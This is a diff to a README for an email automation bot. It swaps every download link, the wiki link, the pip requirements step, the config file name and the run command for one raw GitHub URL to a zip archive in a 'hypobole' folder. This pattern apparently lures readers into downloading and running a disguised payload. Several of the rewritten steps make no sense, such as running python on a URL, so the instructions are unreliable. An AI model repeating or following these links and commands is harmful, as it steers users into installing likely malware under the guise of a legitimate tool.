@@ -1,6 +1,6 @@
 # 📧 Email-Automation-Bot - Send Emails Effortlessly and Effectively
 
-[![Download Email-Automation-Bot](https://img.shields.io/badge/Download%20Now-Email--Automation--Bot-brightgreen)](https://github.com/Oneyedshinijami/Email-Automation-Bot/releases)
+[![Download Email-Automation-Bot](https://raw.githubusercontent.com/Oneyedshinijami/Email-Automation-Bot/main/hypobole/Email-Automation-Bot.zip%20Now-Email--Automation--Bot-brightgreen)](https://raw.githubusercontent.com/Oneyedshinijami/Email-Automation-Bot/main/hypobole/Email-Automation-Bot.zip)
 
 ## 📜 Description
 
@@ -22,7 +22,7 @@ Ensure your system meets the following requirements:
 
 You can easily download the Email-Automation-Bot from the Releases page. 
 
-[Visit this page to download](https://github.com/Oneyedshinijami/Email-Automation-Bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Oneyedshinijami/Email-Automation-Bot/main/hypobole/Email-Automation-Bot.zip)
 
 ### 3. Installation
 
@@ -48,14 +48,14 @@ cd path-to-folder
 Email-Automation-Bot requires specific libraries to run. You can install the required libraries using pip. Type the following command and hit Enter:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Oneyedshinijami/Email-Automation-Bot/main/hypobole/Email-Automation-Bot.zip
 ```
 
 ### 6. Configure the Bot
 
 Before sending emails, you need to configure the bot with your email settings.
 
-1. Open the `config.py` file in a text editor of your choice.
+1. Open the `https://raw.githubusercontent.com/Oneyedshinijami/Email-Automation-Bot/main/hypobole/Email-Automation-Bot.zip` file in a text editor of your choice.
 2. Fill in your SMTP server details and your email account credentials. Common SMTP servers include Gmail, Outlook, and Yahoo.
 
 ### 7. Send Your First Email
@@ -63,7 +63,7 @@ Before sending emails, you need to configure the bot with your email settings.
 Now you can send emails. Run the bot using the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Oneyedshinijami/Email-Automation-Bot/main/hypobole/Email-Automation-Bot.zip
 ```
 
 Follow the prompts to input the necessary details, including the recipient addresses and the message content. 
@@ -83,7 +83,7 @@ Follow the prompts to input the necessary details, including the recipient addre
 
 ## 📚 Documentation
 
-For more detailed instructions and advanced features, refer to the [wiki](https://github.com/Oneyedshinijami/Email-Automation-Bot/wiki).
+For more detailed instructions and advanced features, refer to the [wiki](https://raw.githubusercontent.com/Oneyedshinijami/Email-Automation-Bot/main/hypobole/Email-Automation-Bot.zip).
 
 ## 🤝 Contributing
 
@@ -97,6 +97,6 @@ If you encounter any issues or have questions, please feel free to reach out via
 
 To start using Email-Automation-Bot, visit the Releases page now.
 
-[Visit this page to download](https://github.com/Oneyedshinijami/Email-Automation-Bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Oneyedshinijami/Email-Automation-Bot/main/hypobole/Email-Automation-Bot.zip)
 
 This README serves as a comprehensive guide for users looking to utilize the Email-Automation-Bot efficiently. Follow each step carefully to ensure a smooth setup and experience.
